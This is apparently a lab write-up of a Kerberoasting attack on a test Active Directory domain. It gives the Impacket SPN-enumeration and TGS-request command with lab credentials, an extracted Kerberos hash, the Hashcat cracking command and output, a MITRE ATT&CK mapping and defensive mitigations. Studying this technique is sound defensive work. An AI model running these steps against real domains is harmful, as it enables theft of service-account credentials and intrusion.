## Overview
---
**Kerberoasting** is a post-exploitation credential access technique targeting Active Directory environments. Any authenticated domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any account registered with a Service Principal Name (SPN).

Because portions of the TGS ticket (the `TGS-REP`) are encrypted using the target service account's password hash, an attacker can extract this encrypted payload and perform an offline brute-force or dictionary attack to recover the plaintext password without triggering account lockouts or generating noisy network traffic.

---
## Lab Setup

| Machine / Role | OS / Platform | Function / Services |
| --- | --- | --- |
| **Domain Controller (DC01)** | Windows Server 2025 | Active Directory, KDC, DNS (`192.168.56.107`) |
| **Attacker Workstation** | Kali Linux | Running Impacket scripts (`GetUserSPNs.py`) |
| **Cracking Station** | Kali / Windows Server | Offline hash cracking via Hashcat |

### Target Account Credentials

* **Domain:** `pekka.local`
* **Authenticated Domain User:** `hannibal`
* **Password:** `human123!`
* **DC IP Address:** `192.168.56.107`

---

## Tools Used

* **Impacket (`GetUserSPNs`):** Queries Active Directory via LDAP for accounts with registered SPNs and requests Kerberos TGS tickets formatted for hash cracking.
* **Hashcat:** Advanced GPU/CPU password recovery utility used to crack extracted `$krb5tgs$` Kerberos hashes offline.
* **Wordlist:** `rockyou.txt`

---

## Attack Execution Steps

### Step 1: Enumerating SPNs & Requesting TGS Tickets

Using valid domain credentials (`hannibal`), an LDAP query was executed against the Domain Controller (`192.168.56.107`) to locate user accounts linked to Service Principal Names and request their TGS tickets:

```bash
impacket-GetUserSPNs pekka.local/hannibal:human123! -dc-ip 192.168.56.107 -request

```

#### Output & Extracted Hash

The query successfully identified an active SPN tied to the user service account `sql_spn`:

```text
ServicePrincipalName                 Name     MemberOf  PasswordLastSet             LastLogon                  
-----------------------------------  -------  --------  -------------------------- 
MSSQLSvc/sqlserver.pekka.local:1433  sql_spn            2026-07-10 12:40:37.227890  2026-07-10 13:08:37.554862 

$krb5tgs$18$sql_spn$PEKKA.LOCAL$*pekka.local/sql_spn*$52c7e22afcd43d7c0629414f$351e...8166a8

```

---

### Step 2: Offline Password Cracking via Hashcat

The extracted Kerberos 5 TGS ticket hash (`etype 18` / AES-256 or `etype 23` / RC4) was saved and subjected to a dictionary attack using Hashcat with mode `19700` (`Kerberos 5, etype 18, TGS-REP`):

```bash
hashcat -m 19700 hash.txt /tools/wordlist/rockyou.txt

```

#### Cracking Result

```shell
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19700 (Kerberos 5, etype 18, TGS-REP)
Hash.Target......: $krb5tgs$18$sql_spn$PEKKA.LOCAL$52c7e22afcd43d7c062...8166a8
Time.Started.....: Tue Aug 04 21:45:23 2026 (1 min, 10 secs)
Recovered........: 1/1 (100.00%) Digests (total)
Candidate.Engine.: Device Generator
Candidates.#01...: Montrose3 -> March3490

```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-Technique / Description |
| --- | --- | --- |
| **Credential Access** | **[T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)** | **[T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)**: Adversaries request Kerberos TGS tickets for SPNs to extract password hashes for offline brute-forcing. |
| **Credential Access** | **[T1110 - Brute Force](https://attack.mitre.org/techniques/T1110/)** | **[T1110.002 - Password Cracking](https://attack.mitre.org/techniques/T1110/002/)**: Utilizing offline dictionary tools (Hashcat) against stolen encrypted Kerberos ticket hashes. |
| **Reconnaissance** | **[T1590 - Gather Victim Network Information](https://attack.mitre.org/techniques/T1590/)** | Enumerating Active Directory objects and SPN mappings via LDAP queries. |

---

## Defensive Recommendations & Mitigation

* **Group Managed Service Accounts (gMSA):** Transition service accounts to gMSAs. Windows automatically manages gMSA passwords (128-character complex passwords changed regularly), rendering offline cracking mathematically infeasible.
* **Enforce Strong Password Policies:** Ensure service accounts with manual passwords use complex strings (25+ characters).
* **Kerberos Encryption:** Disable weak RC4 encryption across Kerberos and enforce AES-128/AES-256.
* **Detection & Monitoring:**
* Monitor Windows **Event ID 4769** (*A Kerberos service ticket was requested*).
* Flag anomalous surges in TGS requests, specifically requests originating from non-service host accounts or requesting RC4 encryption.



---

## Verification Checklist

[x] LDAP query successfully enumerated registered SPNs across `pekka.local`.
[x] Kerberos TGS ticket requested and captured via Impacket.
[x] Hashcat successfully cracked the encrypted service account hash offline.
[x] MITRE ATT&CK mapping and defensive mitigations documented.